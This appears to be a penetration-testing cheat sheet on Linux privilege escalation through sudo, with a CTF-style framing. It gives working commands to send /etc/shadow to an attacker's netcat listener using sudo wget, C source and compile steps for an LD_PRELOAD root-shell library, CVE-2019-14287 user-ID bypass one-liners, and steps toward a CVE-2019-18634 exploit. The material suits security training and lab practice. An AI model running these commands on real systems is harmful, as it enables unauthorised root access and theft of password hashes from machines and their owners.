Abusing Sudo

Sudo Shell Escaping

Checking Sudo Rights for Current User

~~~bash
sudo -l
~~~

Lists all applications that can be run as root or another user that potentially has higher privileges (with or without a password).

GTFOBins

GTFOBins Github.io

Escaping underprivileged shell cheatsheet

Intended Functionality

Using a binary that does not have the ability to gain a privileged shell, but does have sudo capability when viewing in “sudo -l”.

ex. You have sudo capability for wget in the "sudo -l" output:

Attacker Machine:

~~~bash
nc -vnlp 4444
~~~

Victim Machine:

~~~bash
sudo wget --post-file=/etc/shadow <ATTACKER-IP> 4444
~~~

This example will dump the shadow file on to the attacker's netcat session and will be readable by the attacker machine and can then be used to decrypt the shadow file. Please note that this can be used to read other files that are not readily accessible by the underprivileged user.

ex. You know that there is a file named flag.txt located in /root. You can --post-file=/root/flag.txt instead of shadow to obtain the root flag.
sudo -l

LD_PRELOAD

LD_PRELOAD may show up when performing a “sudo -l” command. This will allow us to create our own custom SO to escape the underprivileged account and run as root.

C Code for the SO (shell.c):

~~~c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
~~~

After saving this file on the victim machine, compile using GCC:

~~~bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
~~~

After compiling the SO file from the C Code, you will need to execute LD_PRELOAD with the SO file (with full path to SO file) as sudo against a service that you have sudo rights to:

~~~bash
sudo LD_PRELOAD=/home/user/shell.so apache2
~~~

SUDO EXPLOIT - CVE-2019-14287

~~~bash
#Taking over root account
sudo -u#-1 /bin/bash
# OR
sudo -u#4294967295 /bin/bash

#Taking over another user account
sudo -u#+1000 /bin/bash
~~~

SUDO BUFFER OVERFLOW - CVE-2019-18634

Begin by checking out the sudoers file at "/etc/sudoers" and look for an uncommented section that contains the word “pwfeedback”

THIS IS ONLY VULNERABLE FOR VERSIONS 1.8.26 OR EARLIER WITH "pwfeedback" ENABLED

Determining version of sudo and if pwfeedback is enabled: 

~~~bash
#Determining the version of sudo
sudo -V
#Checking if we can read the sudoers file for the pwfeedback option
cat /etc/sudoers
#If unable to access the sudoers file, run “sudo su root” and see if you get asterisks when typing in a password
sudo su root
~~~

Exploit Code:

Compile the exploit.c file by performing the following command:

~~~bash
gcc exploit.c -o exploit
~~~

https://github.com/saleemrashid/sudo-cve-2019-18634
